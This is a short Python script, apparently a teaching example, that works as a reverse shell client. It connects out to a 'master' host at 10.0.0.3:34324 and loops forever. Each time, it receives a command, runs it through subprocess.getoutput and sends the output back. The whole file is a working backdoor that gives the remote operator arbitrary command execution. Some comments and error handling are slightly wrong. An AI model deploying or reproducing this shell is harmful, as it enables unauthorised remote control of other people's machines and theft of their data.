import socket
import subprocess
import struct

# Create socket with socket class.
slave = socket.socket()

# Host is the IP address of slave machine.
host = "10.0.0.3"

# This will be the port that master
# machine listens.
port = 34324

# connect to the master machine with connect
# command.
slave.connect((host, port))


while True:

    def recvall(socket, n):
        # Helper function to recv n bytes or return None if EOF is hit
        data = bytearray()
        while len(data) < n:
            packet = socket.recv(n - len(data))
            if not packet:
                return None
            data.extend(packet)
        return data

    # Read header message length
    msglen = recvall(slave, 4) # 4 because of the 4-bytes size prefix
    if not msglen:
        print("error")
    msglen = struct.unpack('>I', msglen)[0]

    # Read message type
    msgtype = recvall(slave, 4)
    if not msgtype:
        print("error")
    msgtype = struct.unpack('>I', msgtype)[0]

    # Read the message
    msg = recvall(slave, msglen)

    output  = "output:\n"

    print(msglen, msg)
    # getoutput method executes the command and
    # returns the output.
    output += subprocess.getoutput(msg.decode('utf-8'))

    # Encode and send the output of the command to
    # the master machine.
    slave.send(output.encode())

# close method closes the connection.
slave.close()



